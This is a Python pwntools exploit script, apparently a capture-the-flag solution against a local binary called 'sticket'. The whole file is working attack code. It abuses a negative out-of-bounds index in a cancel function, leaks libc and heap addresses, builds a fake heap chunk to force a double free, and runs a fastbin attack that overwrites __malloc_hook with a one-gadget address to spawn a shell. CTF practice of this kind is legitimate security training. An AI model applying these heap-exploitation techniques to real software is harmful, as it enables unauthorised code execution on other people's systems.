# Negative OOB in cancel()

from pwn import *

def reserve(size, data):
	for i in xrange(5):
		r.sendlineafter('>> ', '1')
	r.sendlineafter('>> ', str(size))
	if size == 0:
		return
	else:
		r.sendlineafter('>> ', data[:size-1])
	return

def confirm():
	r.sendlineafter('>> ', '2')
	return

def cancel(idx):
	r.sendlineafter('>> ', '3')
	r.sendlineafter('>> ', str(idx))
	return

def leak(idx, what):
	confirm()
	for i in xrange(idx):
		r.recvuntil('comment : ')

	if what == 'libc':
		return u64(r.recv(6).ljust(8, chr(0)))
	else:
		return u64(r.recv(3).ljust(8, chr(0)))

def logout():
	r.sendlineafter('>> ', '0')
	return

def pwn():

	r.sendlineafter(': ', p64(0xb00bface))

	reserve(0xf0, 'A'*0x10) # 1
	reserve(0x80, 'B'*0x10) # 2

	cancel(1)

	# Split unsorted chunk, read no data in it, leak libc
	reserve(0, '') # 1

	libc          = leak(1, 'libc') - 0x3c4c68
	magic         = libc + 0xf1147
	__malloc_hook = libc + 0x3c4b10
	log.success('Libc: 0x{:x}'.format(libc))

	# clean up the heap and start over
	cancel(1)
	cancel(2)

	# create two fast chunks
	reserve(0x18, 'A'*0x10) # 1
	reserve(0x18, 'B'*0x10) # 2

	# free them both in order to form a heap linked list
	cancel(1)
	# sticket's #2 FD points to sticket #1, we'll use that to leak heap
	cancel(2)

	reserve(0, '') # 1

	heap = leak(1, 'heap') - 0x120
	log.success('Heap: 0x{:x}'.format(heap))

	# clean up and start over
	cancel(1)

	logout()

	# craft fake heap chunk in the bss in order to double-free
	# the comment pointer of sticket #1 via cancel(0)
	chunk  = p64(0xb00bface)
	# chunk's size
	chunk += p64(0x21)
	chunk += p64(0)*2
	# comment pointer
	chunk += p64(heap + 0x70)
	# prevent _int_free from complaining about invalid next size
	chunk += p64(0x21)
	chunk += p64(0xb00bface) * (11 - 6)
	# sticket address to be accessed during negative OOB
	chunk += p64(0x602230)

	r.sendlineafter(': ', chunk)
	r.sendlineafter(': ', 'kek')
	
	reserve(0x60, 'A'*0x10) # 1
	reserve(0x60, 'B'*0x10) # 2
	
	# double free
	cancel(0)
	cancel(2)
	cancel(1)

	# fastbin attack
	reserve(0x60, p64(__malloc_hook - 0x23)) 
	reserve(0x60, 'A'*0x10)
	reserve(0x60, 'A'*0x10)
	reserve(0x60, 'A'*0x13 + p64(magic))

	r.sendlineafter('>> ', '1')
	
	r.interactive()

if __name__ == "__main__":
	r = process('./sticket')
	pause()
	pwn()
